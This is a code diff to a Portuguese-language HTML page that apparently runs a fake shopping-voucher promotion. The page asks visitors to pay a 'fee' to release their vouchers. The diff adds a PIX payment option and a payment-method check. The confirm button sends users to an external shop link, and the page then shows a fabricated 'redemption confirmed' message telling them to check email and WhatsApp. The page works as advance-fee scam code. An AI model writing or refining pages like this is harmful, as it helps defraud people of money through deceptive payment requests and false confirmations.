@@ -135,7 +135,14 @@
                 <p><strong>🔒 Essa taxa cobre os custos operacionais da liberação dos vales e garante a entrega segura do benefício, evitando cadastros duplicados ou tentativas de fraude.</strong></p>
             </div>
             
-                        
+            <h3>Escolha seu método de pagamento:</h3>
+            
+            <div class="payment-options">
+                <div class="payment-option" data-method="pix">
+                    <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" alt="PIX">                    
+                </div>
+            </div>
+            
             <button id="confirmBtn" class="confirm-btn">CONFIRMAR PARTICIPAÇÃO</button>
             
             <div class="security-badge">
@@ -491,34 +498,37 @@
             
             // Confirmar participação
              confirmBtn.addEventListener('click', function() {
+                if (!selectedPaymentMethod) {
+                    alert('Por favor, selecione um método de pagamento.');
+                    return;
+                }
+                
                 // Redirect to the specified link
                 window.location.href = "https://go.disruptybr.shop/3unutjdqew";
-                });
-                
-                
                              
               
                 
                 // Simulação: após 3 segundos, mostrar mensagem de sucesso
-    setTimeout(() => {
-        offerConfirmation.innerHTML = `
-            <div style="padding: 30px;">
-                <svg width="80" height="80" viewBox="0 0 24 24" fill="#2ecc71" style="margin-bottom: 20px;">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
-                </svg>
-                <h2 style="color: #2ecc71;">Resgate confirmado com sucesso!</h2>
-                <p>Seu vale-compra está sendo processado e você receberá o link exclusivo em instantes.</p>
-                <p><strong>Verifique seu e-mail e WhatsApp</strong> para acessar seu benefício.</p>
-                <div class="security-badge" style="margin-top: 30px;">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#2ecc71" stroke="#2ecc71" stroke-width="2">
-                        <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm-1.06 13.54L7.4 12l1.41-1.41 2.12 2.12 4.24-4.24 1.41 1.41-5.64 5.66z"></path>
-                    </svg>
-                    Obrigado por participar da nossa promoção!
-                </div>
-            </div>
-        `;
-    }, 3000); // Alterado para 3000ms (3 segundos) para combinar com o comentário
-});
+                setTimeout(() => {
+                    offerConfirmation.innerHTML = `
+                        <div style="padding: 30px;">
+                            <svg width="80" height="80" viewBox="0 0 24 24" fill="#2ecc71" style="margin-bottom: 20px;">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
+                            </svg>
+                            <h2 style="color: #2ecc71;">Resgate confirmado com sucesso!</h2>
+                            <p>Seu vale-compra está sendo processado e você receberá o link exclusivo em instantes.</p>
+                            <p><strong>Verifique seu e-mail e WhatsApp</strong> para acessar seu benefício.</p>
+                            <div class="security-badge" style="margin-top: 30px;">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="#2ecc71" stroke="#2ecc71" stroke-width="2">
+                                    <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm-1.06 13.54L7.4 12l1.41-1.41 2.12 2.12 4.24-4.24 1.41 1.41-5.64 5.66z"></path>
+                                </svg>
+                                Obrigado por participar da nossa promoção!
+                            </div>
+                        </div>
+                    `;
+                }, 1000);
+            });
+        });
     </script>
 </body>
 </html>
